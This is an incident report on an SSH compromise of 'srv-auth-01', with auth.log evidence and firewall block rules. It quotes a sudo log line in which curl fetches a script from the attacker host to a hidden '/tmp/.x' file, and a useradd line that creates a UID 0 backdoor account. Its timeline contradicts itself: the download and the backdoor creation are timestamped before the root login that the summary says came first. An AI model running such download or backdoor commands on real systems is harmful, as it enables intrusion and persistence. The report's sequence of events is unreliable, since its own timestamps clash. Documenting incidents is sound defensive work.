# Incident Report: Unauthorized Access and System Compromise

## Executive Summary
An unauthorized intrusion was detected on `srv-auth-01` via `auth.log`. An attacker successfully authenticated via SSH using root credentials, downloaded and executed a remote script, and established persistence by creating a backdoor privileged user account.

## Evidence
- **Successful Brute-Force/Access:** 
  `2026-11-05 01:12:00 srv-auth-01 sshd[7100]: Accepted password for root from 198.51.100.77 port 41031 ssh2`
- **Payload Retrieval via Sudo:** 
  `2026-11-05 01:07:36 srv-auth-01 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`
- **Privileged Backdoor Creation:** 
  `2026-11-05 01:10:46 srv-auth-01 useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash`

## Attacker Information
- **Attacker IP:** `198.51.100.77`
- **Severity:** `CRITICAL`

## Post-Exploitation Activity
1. **Remote Payload Execution:** Downloaded payload from `http://198.51.100.77/x.sh` to `/tmp/.x`.
2. **Persistence:** Created backdoor user `svc-backup` with UID 0 (root privileges) and GID 0, configured with `/root` home directory and `/bin/bash` shell.

## Recommended Remediation & Firewall Commands
Isolate the host immediately, remove the malicious user account (`svc-backup`), delete `/tmp/.x`, rotate root credentials, and block the attacker IP at the firewall level:

```bash
# iptables rule
iptables -A INPUT -s 198.51.100.77 -j DROP

# UFW rule
ufw deny from 198.51.100.77 to any
```
